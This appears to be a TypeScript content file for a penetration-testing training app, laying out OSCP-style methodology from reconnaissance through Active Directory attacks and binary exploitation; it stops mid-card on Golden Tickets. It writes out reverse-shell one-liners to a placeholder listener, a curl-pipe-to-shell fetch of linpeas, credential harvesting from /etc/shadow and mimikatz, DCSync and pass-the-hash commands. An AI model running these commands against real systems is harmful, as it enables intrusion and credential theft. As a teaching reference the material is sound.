import type { MethodologyData, MethodologyPhase } from "./types";

// ---------------------------------------------------------------------------
// CORE PHASES — general pentest methodology (recon through report).
// Transcribed and enriched from the player-supplied OSCP methodology
// reference, rebuilt as structured content with "TOOL CHOICE" notes (why one
// tool over an overlapping other) and "RECOGNITION" notes (the observable
// signal that tells you to reach for a given technique) layered on top of
// the original checklist/command material.
// ---------------------------------------------------------------------------

const recon: MethodologyPhase = {
  id: "recon",
  navLabel: "01 · RECON",
  title: "Reconnaissance",
  group: "core",
  cards: [
    {
      id: "recon-1",
      number: "01.1",
      title: "Initial Port Scan",
      tags: [
        { label: "ALWAYS FIRST", color: "red" },
        { label: "ALL TARGETS", color: "blue" },
      ],
      notes: [
        { tone: "danger", title: "Rule", body: "Run this on every target the moment you touch it. Don't wait on anything else — fire the scan and keep working while it runs." },
        { tone: "info", title: "RECOGNITION", body: "There is no vulnerability class this phase doesn't apply to. Every engagement starts here, full stop — the only variable is how deep you go before moving on." },
      ],
      commandBlocks: [
        {
          label: "Full TCP — all ports, fast",
          lines: [
            "# fast full scan — run this first",
            "sudo nmap -p- --min-rate 5000 -T4 {{IP}} -oN scans/nmap-full.txt",
            "",
            "# then a deep scripted/version scan on just the open ports",
            "sudo nmap -p {{PORTS}} -sC -sV -T4 {{IP}} -oN scans/nmap-targeted.txt",
          ],
        },
        {
          label: "UDP — top 20 (don't skip this)",
          lines: ["sudo nmap -sU --top-ports 20 {{IP}} -oN scans/nmap-udp.txt"],
        },
      ],
    },
    {
      id: "recon-2",
      number: "01.2",
      title: "Service Fingerprinting",
      tags: [{ label: "ALL TARGETS", color: "blue" }],
      steps: [
        "Note every open port and its exact service version",
        "Look up CVEs for exact version numbers immediately, don't defer it",
        "Identify the OS (Windows vs Linux changes your whole approach from here)",
        "Note any unusual or high-numbered ports — often the actual key to the box",
      ],
      commandBlocks: [{ label: "Banner grab", lines: ["nc -nv {{IP}} {{PORT}}", "curl -I http://{{IP}}"] }],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "nc for anything that isn't HTTP — it prints whatever the service says the moment you connect, no assumptions. curl -I for HTTP specifically, since it understands the protocol enough to give you headers cleanly instead of raw bytes.",
        },
      ],
    },
    {
      id: "recon-3",
      number: "01.3",
      title: "Web Recon (if HTTP/HTTPS present)",
      tags: [{ label: "WEB", color: "green" }],
      commandBlocks: [
        {
          label: "Directory brute force",
          lines: [
            "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 40 -o scans/gobuster.txt",
            "",
            "# feroxbuster — recurses automatically",
            "feroxbuster -u http://{{IP}} -t 50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
          ],
        },
        { label: "Tech detection", lines: ["whatweb http://{{IP}}", "# check the Wappalyzer browser extension manually too"] },
      ],
      steps: [
        "Check robots.txt and sitemap.xml manually — before any brute force",
        "View page source — comments, hidden fields, linked JS files",
        "Check for default credentials on any login pages",
        "Note CMS/framework version (WordPress, Joomla, etc.) — searchsploit it immediately",
      ],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "gobuster is the muscle-memory default — fast, simple, no surprises. feroxbuster earns its place when the app is deep (it recurses into found directories automatically instead of you re-running gobuster on every hit) or the target is slow, since its Rust core handles large wordlists faster. dirb still shows up in older write-ups but is slower than both with no real advantage today — recognize it, don't reach for it.",
        },
      ],
    },
  ],
};

const enumPhase: MethodologyPhase = {
  id: "enum",
  navLabel: "02 · ENUM",
  title: "Enumeration",
  group: "core",
  cards: [
    {
      id: "enum-1",
      number: "02.1",
      title: "SMB Enumeration",
      tags: [
        { label: "WINDOWS", color: "yellow" },
        { label: "PORT 445", color: "blue" },
      ],
      commandBlocks: [
        {
          label: "SMB enum commands",
          lines: [
            "# null session check",
            "smbclient -L //{{IP}} -N",
            "smbmap -H {{IP}}",
            "",
            "# enum4linux — full auto",
            "enum4linux -a {{IP}}",
            "",
            "# nmap smb scripts",
            "nmap --script smb-enum-shares,smb-enum-users -p 445 {{IP}}",
            "",
            "# connect to a share",
            "smbclient //{{IP}}/{{SHARE}} -N",
          ],
        },
      ],
      steps: [
        "List every share — readable AND non-readable ones both matter",
        "Download everything readable, grep it later rather than reading live",
        "Look for credentials, config files, deployment scripts",
        "Check whether you can write to any share",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "Port 445 open is worth a null-session check every single time, even with zero credentials — a surprising number of boxes leak share listings or user lists to an unauthenticated session." },
      ],
    },
    {
      id: "enum-2",
      number: "02.2",
      title: "SNMP / Other Services",
      tags: [{ label: "UDP 161", color: "blue" }],
      commandBlocks: [
        { label: "SNMP walk", lines: ["onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{IP}}", "snmpwalk -v2c -c public {{IP}}"] },
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "The community string \"public\" is worth trying blind on any SNMP port before you bother brute-forcing one — it's the out-of-the-box default and gets left on constantly." },
      ],
      steps: [
        "FTP (21) — anonymous login? grab everything if so",
        "SSH (22) — note the version, check for username enumeration",
        "SMTP (25) — user enumeration via VRFY/EXPN",
        "NFS (2049) — showmount -e $IP, then mount and browse it",
        "MSSQL/MySQL — default credentials, version-specific exploits",
        "RDP (3389) — note it for later access, don't brute-force it early",
        "WinRM (5985) — evil-winrm the moment you have any valid credential",
      ],
    },
    {
      id: "enum-3",
      number: "02.3",
      title: "Vulnerability Scanning",
      tags: [{ label: "ALL TARGETS", color: "blue" }],
      commandBlocks: [
        {
          label: "Searchsploit + nmap vuln scripts",
          lines: [
            "# search by exact service/version",
            "searchsploit {{SERVICE}} {{VERSION}}",
            "searchsploit -m {{EDB_ID}}",
            "",
            "# broader nmap vuln scan",
            "nmap --script vuln -p {{PORTS}} {{IP}} -oN scans/vuln.txt",
          ],
        },
      ],
      notes: [
        { tone: "info", title: "Decision Point", body: "After enum you should have 2-3 ranked candidate vectors written down. Work the most promising one first with a 45-minute timer — if nothing pans out, move to the next rather than tunneling." },
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "searchsploit first — it's offline, instant, and matches exact version strings against a curated local database. Only fall back to a live CVE/NVD search when the exact version isn't in that local database at all; searchsploit's local copy can lag behind the newest disclosures.",
        },
      ],
    },
  ],
};

const exploit: MethodologyPhase = {
  id: "exploit",
  navLabel: "03 · EXPLOIT",
  title: "Exploitation",
  group: "core",
  cards: [
    {
      id: "exploit-1",
      number: "03.1",
      title: "Web Application Attacks",
      tags: [{ label: "WEB", color: "green" }],
      subsections: [
        {
          heading: "SQLi",
          commandBlocks: [
            {
              label: "SQLMap",
              lines: [
                'sqlmap -u "http://{{IP}}/page?id=1" --dbs',
                'sqlmap -u "http://{{IP}}/page?id=1" -D {{DB}} --tables',
                '# --os-shell only if stacked queries actually work',
                'sqlmap -u "http://{{IP}}/page?id=1" --os-shell',
              ],
            },
          ],
        },
        {
          heading: "File Inclusion",
          steps: [
            "LFI: try /etc/passwd, /etc/shadow, web configs",
            "LFI → RCE: log poisoning (Apache/Nginx access logs, SSH auth logs)",
            "RFI: host malicious PHP somewhere reachable, include it",
            "PHP wrappers: php://filter, data://, expect://",
          ],
        },
        {
          heading: "Upload Bypass",
          steps: [
            "Change extension: .php → .php5, .phtml, .pHp",
            "Change Content-Type in an intercepting proxy",
            "Double extension: shell.jpg.php",
            "Add magic bytes to satisfy a MIME/content check",
          ],
        },
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "SQLi: an error message that echoes back real SQL syntax, or a page that behaves differently for id=1 versus id=1' — that difference in behavior is the whole signal, you don't need the error message to confirm it." },
        { tone: "info", title: "RECOGNITION", body: "LFI: any parameter that looks like a filename or path, especially one that's visibly already loading local content (a \"page=\" or \"template=\" style parameter) rather than passing data." },
      ],
    },
    {
      id: "exploit-2",
      number: "03.2",
      title: "Reverse Shells",
      tags: [{ label: "GET ACCESS", color: "red" }],
      commandBlocks: [
        {
          label: "Listener + common shells",
          lines: [
            "# listener",
            "rlwrap nc -lvnp {{LPORT}}",
            "",
            "# bash",
            "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
            "",
            "# python3",
            'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
          ],
        },
        {
          label: "Shell upgrade (always do this)",
          lines: [
            'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
            "# then: Ctrl+Z -> stty raw -echo; fg -> Enter twice",
            "export TERM=xterm",
          ],
        },
      ],
      notes: [
        { tone: "danger", title: "Critical", body: "Always upgrade your shell before doing anything else. A raw shell has no tab-complete, no Ctrl+C, no arrow keys — it costs 30 seconds to fix and saves real pain later." },
      ],
    },
    {
      id: "exploit-3",
      number: "03.3",
      title: "Password Attacks",
      tags: [{ label: "ALL TARGETS", color: "blue" }],
      commandBlocks: [
        {
          label: "Hydra brute force",
          lines: [
            "# ssh",
            "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt ssh://{{IP}}",
            "",
            "# HTTP POST form",
            'hydra -l admin -P rockyou.txt {{IP}} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"',
            "",
            "# hash crack",
            "hashcat -m {{MODE}} hash.txt /usr/share/wordlists/rockyou.txt",
          ],
        },
      ],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "Hydra is a last resort, not an opener. Try default/known/vendor credentials by hand first — brute force is loud, can trigger lockouts that cost you an account entirely, and floods logs in a way that a real client engagement would flag as reckless. Reach for hydra once you've confirmed there's no cheaper way in.",
        },
      ],
    },
  ],
};

const privesc: MethodologyPhase = {
  id: "privesc",
  navLabel: "04 · PRIVESC",
  title: "Privilege Escalation",
  group: "core",
  cards: [
    {
      id: "privesc-1",
      number: "04.1",
      title: "Linux Privilege Escalation",
      tags: [
        { label: "LINUX", color: "green" },
        { label: "HIGH PRIORITY", color: "red" },
      ],
      commandBlocks: [
        {
          label: "Run automated enum first",
          lines: [
            "# linpeas — most comprehensive",
            "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "# or transfer + run: chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out",
          ],
        },
      ],
      steps: [
        "sudo -l — what can the current user run as root?",
        "SUID/SGID binaries — find / -perm -4000 2>/dev/null — check every hit against GTFOBins",
        "Cron jobs — cat /etc/crontab, /etc/cron.* — any writable scripts?",
        "Writable /etc/passwd — add a root user directly",
        "Capabilities — getcap -r / 2>/dev/null",
        "Running processes (pspy) — root processes with writable configs?",
        "Kernel exploits — uname -a, searchsploit the version",
        "Passwords in config files, shell history, environment variables",
        "NFS no_root_squash — showmount -e localhost",
        "Docker group membership",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "A SUID bit set on a binary that's also listed in GTFOBins is a privesc primitive on its own — that combination is the whole check, no further reasoning required." },
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "Run linpeas first — it flags far more than you'd manually check and won't miss anything obvious. But work the manual checklist too: automated tools surface noise as well as signal, and understanding WHY a given finding is exploitable (not just that a script flagged it) is what actually transfers to a live exam with no script available, or a box hardened enough that linpeas comes back mostly clean.",
        },
      ],
    },
    {
      id: "privesc-2",
      number: "04.2",
      title: "Windows Privilege Escalation",
      tags: [
        { label: "WINDOWS", color: "yellow" },
        { label: "HIGH PRIORITY", color: "red" },
      ],
      commandBlocks: [
        { label: "Automated enum", lines: [".\\winPEAS.exe", "", "# PowerUp", "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"] },
        { label: "Potato attacks (SeImpersonate)", lines: ["# PrintSpoofer", ".\\PrintSpoofer.exe -i -c cmd", "", "# GodPotato", '.\\GodPotato.exe -cmd "cmd /c whoami"'] },
      ],
      steps: [
        "whoami /priv — SeImpersonatePrivilege enabled means Potato attacks",
        "whoami /groups — check group memberships",
        "Unquoted service paths — sc qc {{SERVICE}}",
        "Weak service permissions — accesschk.exe",
        "AlwaysInstallElevated — reg query",
        "Scheduled tasks — schtasks /query /fo LIST /v",
        "Stored credentials — cmdkey /list, registry",
        "Passwords in files — findstr /si password *.txt *.xml *.ini",
        "DLL hijacking — missing DLLs referenced by a service path",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "whoami /priv showing SeImpersonatePrivilege enabled is the signal, full stop — that's a Potato-family attack (PrintSpoofer/GodPotato) waiting to happen, before you look at anything else." },
      ],
    },
  ],
};

const ad: MethodologyPhase = {
  id: "ad",
  navLabel: "05 · ACTIVE DIR",
  title: "Active Directory",
  group: "core",
  cards: [
    {
      id: "ad-0",
      number: "05.0",
      title: "AD Strategy — Read This First",
      critical: true,
      tags: [
        { label: "CRITICAL", color: "red" },
        { label: "40 PTS", color: "red" },
      ],
      notes: [
        {
          tone: "danger",
          title: "Exam Priority",
          body: "On OSCP-style exams, AD is worth more than any two standalone machines combined. Attack it first. You start with a foothold (a standard user account) — the goal is full domain compromise. Don't abandon it unless you're completely stuck after 2+ hours.",
        },
      ],
      steps: [
        "1. Enumerate the domain with BloodHound — map every path to Domain Admin",
        "2. Find low-hanging privilege escalation paths",
        "3. Move laterally toward higher-value targets",
        "4. Compromise Domain Admin",
        "5. Dump every hash — NTDS.dit or DCSync via secretsdump",
      ],
    },
    {
      id: "ad-1",
      number: "05.1",
      title: "AD Enumeration",
      tags: [
        { label: "WINDOWS", color: "yellow" },
        { label: "DOMAIN", color: "blue" },
      ],
      commandBlocks: [
        {
          label: "BloodHound — run immediately",
          lines: [
            "# on the victim — collect data",
            ".\\SharpHound.exe -c All --zipfilename bh.zip",
            "",
            "# if PowerShell is allowed",
            "Import-Module .\\SharpHound.ps1",
            "Invoke-BloodHound -CollectionMethod All",
            "",
            "# transfer the zip to Kali, import into BloodHound",
            '# queries to run: "Shortest path to DA", "Find AS-REP Roastable"',
          ],
        },
        {
          label: "PowerView quick enum",
          lines: [
            "Import-Module .\\PowerView.ps1",
            "Get-NetDomain",
            "Get-NetUser | select samaccountname,description",
            'Get-NetGroup "Domain Admins"',
            "Get-NetComputer | select name,operatingsystem",
            "# where do we have local admin?",
            "Find-LocalAdminAccess",
          ],
        },
      ],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "BloodHound for graph-scale discovery — \"what's the shortest path to Domain Admin across this whole domain\" is a question only a graph tool can answer well. Reach for a targeted tool (dacledit.py, PowerView) once BloodHound has pointed you at one specific object and you need to confirm its exact rights before acting on them.",
        },
      ],
    },
    {
      id: "ad-2",
      number: "05.2",
      title: "AD Attack Vectors",
      tags: [
        { label: "EXPLOIT", color: "red" },
        { label: "DOMAIN", color: "blue" },
      ],
      subsections: [
        {
          heading: "Kerberoasting",
          commandBlocks: [
            { label: "Get SPN hashes → crack offline", lines: ["GetUserSPNs.py {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{DC_IP}} -request", "hashcat -m 13100 spn_hashes.txt rockyou.txt"] },
          ],
        },
        {
          heading: "AS-REP Roasting",
          commandBlocks: [
            { label: "Users with no preauth", lines: ["GetNPUsers.py {{DOMAIN}}/ -usersfile users.txt -dc-ip {{DC_IP}} -no-pass", "hashcat -m 18200 asrep_hashes.txt rockyou.txt"] },
          ],
        },
        {
          heading: "Pass the Hash",
          commandBlocks: [
            { label: "Use an NTLM hash without cracking it", lines: ["evil-winrm -i {{IP}} -u {{USER}} -H {{HASH}}", "psexec.py {{DOMAIN}}/{{USER}}@{{IP}} -hashes :{{NTLM}}"] },
          ],
        },
        {
          heading: "DCSync (if DA or replication rights)",
          commandBlocks: [
            { label: "Dump every hash", lines: ["secretsdump.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{DC_IP}}", "# or from mimikatz on the DC itself:", "lsadump::dcsync /domain:{{DOMAIN}} /all"] },
          ],
        },
      ],
      steps: [
        "ACL abuse — GenericAll, GenericWrite, WriteDACL on accounts/groups (see phase 10 for the full breakdown)",
        "GPO abuse — write access to a GPO linked to an OU containing target machines",
        "Unconstrained/constrained delegation abuse (see phase 10)",
        "Password spray — check the lockout threshold first, always",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "Any account with an SPN set is roastable by definition — that's the whole check for Kerberoasting. No password guessing involved, just request the ticket and crack it offline." },
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "mimikatz is local, interactive, in-memory — it needs you to already be on the box with a session. secretsdump.py is remote and non-interactive, run straight from your attack machine. That's exactly why DCSync specifically goes through secretsdump rather than mimikatz on the exam: DCSync abuses a network replication protocol, it isn't a local memory read, so the tool that speaks that protocol from outside is the natural fit.",
        },
      ],
    },
    {
      id: "ad-3",
      number: "05.3",
      title: "Lateral Movement",
      tags: [
        { label: "WINDOWS", color: "yellow" },
        { label: "DOMAIN", color: "blue" },
      ],
      commandBlocks: [
        {
          label: "Movement tools",
          lines: [
            "# WinRM",
            "evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}}",
            "",
            "# PsExec",
            "psexec.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",
            "",
            "# WMIExec",
            "wmiexec.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",
            "",
            "# SMBExec",
            "smbexec.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",
          ],
        },
      ],
      notes: [
        { tone: "info", title: "Tip", body: "Always dump credentials from each machine you land on. Reuse found passwords horizontally — spray them against every domain machine you can reach." },
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "psexec.py drops and starts a service on the target — reliable, but the most visible/AV-flaggable of the four. wmiexec.py and smbexec.py are quieter, semi-interactive alternatives with fewer on-disk artifacts. evil-winrm needs WinRM specifically listening and a real credential, but in exchange gives you a clean, native PowerShell session rather than a cmd.exe-flavored one.",
        },
      ],
    },
  ],
};

const postex: MethodologyPhase = {
  id: "postex",
  navLabel: "06 · POST-EX",
  title: "Post-Exploitation",
  group: "core",
  cards: [
    {
      id: "postex-1",
      number: "06.1",
      title: "Proof Collection — Do This Immediately",
      tags: [{ label: "NEVER SKIP", color: "red" }],
      notes: [
        { tone: "danger", title: "The moment you get root/SYSTEM, stop and collect proof", body: "People lose points because they forget to screenshot proof before a machine resets. Do this first, before anything else — including celebrating." },
      ],
      commandBlocks: [
        { label: "Linux proof", lines: ["whoami && hostname && cat /root/proof.txt && ip a", "# screenshot all of this in ONE terminal showing your IP"] },
        { label: "Windows proof", lines: ["whoami && hostname && type C:\\Users\\Administrator\\Desktop\\proof.txt && ipconfig"] },
        {
          label: "Linux credential harvesting",
          lines: ["cat /etc/shadow", 'find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -i "pass\\|secret\\|key" 2>/dev/null', "history"],
        },
        { label: "Windows credentials (mimikatz)", lines: ["privilege::debug", "sekurlsa::logonpasswords", "sekurlsa::wdigest", "lsadump::sam"] },
      ],
    },
    {
      id: "postex-2",
      number: "06.2",
      title: "File Transfers",
      tags: [{ label: "ALL TARGETS", color: "blue" }],
      commandBlocks: [
        {
          label: "Transfer methods",
          lines: [
            "# python HTTP server (Kali)",
            "python3 -m http.server 80",
            "",
            "# Linux download",
            "wget http://{{KALI_IP}}/file.sh",
            "curl -O http://{{KALI_IP}}/file.sh",
            "",
            "# Windows download (PowerShell)",
            "iwr http://{{KALI_IP}}/file.exe -OutFile file.exe",
            "certutil -urlcache -f http://{{KALI_IP}}/file.exe file.exe",
            "",
            "# SMB server (Kali -> Windows)",
            "impacket-smbserver share . -smb2support",
            "# Windows: copy \\\\KALI_IP\\share\\file.exe .",
          ],
        },
      ],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "iwr is the native modern-PowerShell way in and usually the first thing to try. certutil is the fallback worth remembering specifically because it's a built-in Windows binary far more likely to already exist (and be allow-listed) on an older or more locked-down box than anything you'd need to stage yourself.",
        },
      ],
    },
  ],
};

const pivot: MethodologyPhase = {
  id: "pivot",
  navLabel: "07 · PIVOT",
  title: "Network Pivoting",
  group: "core",
  cards: [
    {
      id: "pivot-1",
      number: "07.1",
      title: "Network Pivoting",
      tags: [{ label: "INTERNAL NETWORKS", color: "blue" }],
      commandBlocks: [
        {
          label: "Ligolo-ng (preferred)",
          lines: [
            "# Kali — start the proxy",
            "./proxy -selfcert -laddr 0.0.0.0:11601",
            "",
            "# victim — connect back",
            "./agent -connect {{KALI_IP}}:11601 -ignore-cert",
            "",
            "# Kali — add a route to the internal network",
            "sudo ip route add {{INTERNAL_SUBNET}}/24 dev ligolo",
            "# in the ligolo console: session -> start",
          ],
        },
        {
          label: "SSH tunneling (fallback)",
          lines: [
            "# local port forward — reach one internal service",
            "ssh -L {{LPORT}}:{{INTERNAL_IP}}:{{RPORT}} {{USER}}@{{PIVOT_IP}}",
            "",
            "# dynamic SOCKS proxy",
            "ssh -D 1080 {{USER}}@{{PIVOT_IP}}",
            "# then: proxychains nmap ...",
          ],
        },
      ],
      notes: [
        { tone: "info", title: "Recon through the pivot", body: "Once the pivot is up, re-run recon against the internal subnet exactly like you did externally — start back at phase 01, full methodology, nothing skipped just because you're already inside." },
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "ligolo-ng gives you a real route into the internal network — every tool just works against internal IPs like you're actually on that segment. SSH tunneling is the always-available fallback that needs nothing but SSH access, but every additional service needs its own forward, or a SOCKS proxy plus proxychains in front of every tool you run.",
        },
      ],
    },
  ],
};

const report: MethodologyPhase = {
  id: "report",
  navLabel: "08 · REPORT",
  title: "Report Writing",
  group: "core",
  cards: [
    {
      id: "report-1",
      number: "08.1",
      title: "Report Structure",
      tags: [{ label: "24 HRS AFTER EXAM", color: "red" }],
      notes: [
        { tone: "danger", title: "People fail on the report", body: "Technical success means nothing if the report doesn't document it clearly enough to verify. Write notes during the engagement, not after — you will not remember the details as well as you think." },
      ],
      steps: [
        "Executive Summary — brief, non-technical overview",
        "Methodology — your approach for each target",
        "Per-target sections — walkthrough, screenshots, proof",
        "Each finding: what it is, how you found it, how to fix it",
      ],
    },
    {
      id: "report-2",
      number: "08.2",
      title: "Screenshot Requirements",
      tags: [{ label: "PER TARGET", color: "blue" }],
      steps: [
        "whoami output showing the privileged user",
        "proof.txt contents",
        "Your IP address visible in the same screenshot",
        "Key exploitation steps documented with the actual commands used",
      ],
      notes: [
        { tone: "info", title: "During the engagement", body: "Take screenshots obsessively. You can delete the ones you don't need afterward. You cannot go back and recreate a screenshot of a shell you no longer have." },
      ],
    },
  ],
};

const CORE_PHASES: MethodologyPhase[] = [recon, enumPhase, exploit, privesc, ad, postex, pivot, report];

// ---------------------------------------------------------------------------
// ADVANCED PHASES — authored fresh to match what BREACHLINE's ghost tier
// actually teaches beyond classic OSCP scope: binary exploitation, a second
// AD path built on ACL abuse rather than crackable passwords, cryptographic
// implementation bugs, and modern API auth flaws — plus the professional
// judgment (scope discipline, scanner triage) the ghost tier tests directly.
// ---------------------------------------------------------------------------

const binexp: MethodologyPhase = {
  id: "binexp",
  navLabel: "09 · BINARY EXPLOITATION",
  title: "Binary Exploitation",
  group: "advanced",
  cards: [
    {
      id: "binexp-1",
      number: "09.1",
      title: "Reading the Protections",
      tags: [{ label: "FOUNDATIONAL", color: "green" }],
      commandBlocks: [{ label: "Baseline check — run this before anything else", lines: ["checksec ./{{BINARY}}"] }],
      steps: [
        "Canary — detects stack-smashing before a corrupted return address is used; disabled means a straight overflow can reach it",
        "NX — marks the stack/heap non-executable; enabled means injected shellcode won't run, redirect execution into existing code instead (ROP)",
        "PIE — randomizes the binary's own base address each run; disabled means addresses inside the binary are fixed and reusable across attempts",
        "RELRO — controls whether the GOT is writable after load; anything less than full RELRO leaves a format-string write primitive somewhere to aim at",
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "No canary, NX disabled, and an unstripped binary is classic shellcode-on-the-stack territory before you've even opened a debugger. Every other protection combination changes the plan — that's exactly why this is always the first command." },
      ],
    },
    {
      id: "binexp-2",
      number: "09.2",
      title: "Stack Overflow → ret2win",
      tags: [{ label: "STACK", color: "green" }],
      steps: [
        "Crash it — send an oversized, patterned input and confirm a segfault",
        "Find the exact offset to the return address with a cyclic pattern",
        "Find a \"win\" function address already in the binary (objdump/strings)",
        "Overwrite the return address with that function's address",
      ],
      commandBlocks: [
        { label: "Offset discovery", lines: ["cyclic 200", "./{{BINARY}} $(cyclic 200)", "# read the crashed return address back, look it up with cyclic -l"] },
      ],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "An unstripped binary with a suspicious function that's never called from main() — often named something like win()/give_shell()/backdoor() — plus a bounds-free input routine is the signature of a ret2win-style challenge specifically." },
      ],
    },
    {
      id: "binexp-3",
      number: "09.3",
      title: "ROP Chains",
      tags: [{ label: "NX BYPASS", color: "yellow" }],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "NX enabled, and no obvious win function in an unstripped binary — stop thinking shellcode-on-the-stack, start thinking ROP. You're not injecting code, you're redirecting execution through code the binary already contains." },
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "objdump for a quick grep once you already know the symbol or gadget you're after — fast, no setup. Reach for radare2 or Ghidra when you need real interactive analysis or don't yet know what you're looking for — objdump won't help you reason about control flow you haven't already identified. ROPgadget and ropper do the same job; ROPgadget shows up more often in write-ups and muscle memory, ropper sometimes dedupes gadgets a bit better — pick one and stay fluent in it.",
        },
      ],
      steps: [
        "Find a gadget that loads your first argument (pop rdi; ret on x86-64)",
        "Find the address of a useful function already linked in (system@plt)",
        "Find or place a string to use as that function's argument (\"/bin/sh\")",
        "Chain gadget → string address → function address after your offset padding",
      ],
      commandBlocks: [{ label: "Gadget hunting", lines: ["ROPgadget --binary ./{{BINARY}} | grep 'pop rdi'", "objdump -d ./{{BINARY}} | grep system"] }],
    },
    {
      id: "binexp-4",
      number: "09.4",
      title: "Format String Exploitation",
      tags: [{ label: "FMT STRING", color: "yellow" }],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "Your input gets echoed back through something that behaves like a format string — or the program crashes specifically on %s/%n in your input — is a format string bug, not an overflow. Test it with a handful of %x tokens before assuming anything about the stack layout." },
      ],
      steps: [
        "Confirm the bug — send %x%x%x%x and see if raw stack memory comes back instead of the literal text",
        "Find your input's direct parameter offset with a marker like AAAA%p%p%p%p%p%p",
        "Arbitrary read via %s/%p at a chosen offset, arbitrary write via %n",
        "Target a writable GOT entry for a function that's called soon after",
      ],
      commandBlocks: [
        {
          label: "Building the write payload",
          lines: [
            "# pwntools builds the %n write for you once you know the offset",
            "# fmtstr_payload(offset, dict mapping target address -> new value)",
            "python3 -c \"from pwn import *; print(fmtstr_payload({{OFFSET}}, target_dict))\"",
          ],
        },
      ],
    },
    {
      id: "binexp-5",
      number: "09.5",
      title: "Heap Exploitation — Use-After-Free",
      tags: [{ label: "HEAP", color: "red" }],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "An explicit free followed by continued use of the same reference — the program still lets you \"do something\" with an object after you've deleted it — is a heap use-after-free. Confirm it deliberately: create, delete, then try to use the same object again and watch what happens." },
        { tone: "warning", title: "Heap behavior is allocator-dependent", body: "Chunk size classes matter — reclaiming a freed slot requires allocating something of the same (or a compatible) size, or the allocator will hand you different memory entirely. Confirm the object's size before assuming a reallocation will land where you want." },
      ],
      steps: [
        "Confirm the UAF deliberately (create → delete → use again)",
        "Find a function pointer or vtable-like field inside the freed object's struct, and its exact byte offset",
        "Free the victim slot, then immediately allocate a same-size object with a forged pointer at that offset",
        "Trigger whatever still holds a dangling reference to the original object",
      ],
    },
  ],
};

const adDeep: MethodologyPhase = {
  id: "ad-deep",
  navLabel: "10 · AD DEEP DIVE",
  title: "Active Directory Deep Dive",
  group: "advanced",
  cards: [
    {
      id: "ad-deep-1",
      number: "10.1",
      title: "ACL Abuse",
      tags: [{ label: "ACL", color: "red" }],
      steps: [
        "GenericAll — full control over the object, including resetting its password outright",
        "GenericWrite — write arbitrary attributes, including scriptPath, so the account runs your logon script",
        "WriteDACL — grant yourself any other right over the object after the fact",
        "WriteOwner — take ownership, then grant yourself DACL rights as the new owner",
      ],
      commandBlocks: [{ label: "Read an object's rights directly", lines: ["dacledit.py -action read -target {{TARGET_ACCOUNT}} {{DOMAIN}}/{{USER}}:{{PASS}}"] }],
      notes: [
        { tone: "info", title: "RECOGNITION", body: "BloodHound (or a direct dacledit check) showing GenericAll, WriteDACL, or GenericWrite on an object you didn't expect access to is worth chasing every single time — inherited rights through nested group membership are exactly the kind of thing nobody audits." },
      ],
    },
    {
      id: "ad-deep-2",
      number: "10.2",
      title: "DCSync",
      tags: [{ label: "REPLICATION", color: "red" }],
      steps: [
        "Requires both \"Replicating Directory Changes\" and \"Replicating Directory Changes All\" at the domain root",
        "These rights are meant for legitimate backup/replication tooling — genuinely rare to see granted to a regular account, and dangerous when it happens",
        "Once granted, no interactive session on the DC is needed at all",
      ],
      commandBlocks: [{ label: "Dump every hash in the domain, including krbtgt", lines: ["secretsdump.py -just-dc {{DOMAIN}}/{{USER}}:{{PASS}}@{{DC_IP}}"] }],
      notes: [
        {
          tone: "info",
          title: "TOOL CHOICE",
          body: "mimikatz's lsadump::dcsync needs you locally on a box with LSASS access. secretsdump.py -just-dc does the same abuse remotely and non-interactively from your attack machine — the natural choice, since DCSync is abuse of a network replication protocol between domain controllers, not a local memory read.",
        },
      ],
    },
    {
      id: "ad-deep-3",
      number: "10.3",
      title: "Golden Ticket vs Silver Ticket",
      tags: [{ label: "KERBEROS", color: "blue" }],
      steps: [
        "Golden Ticket — forged from the krbtgt hash. Grants access to any service on any host, valid until krbtgt is reset twice. Loud, broad, durable.",
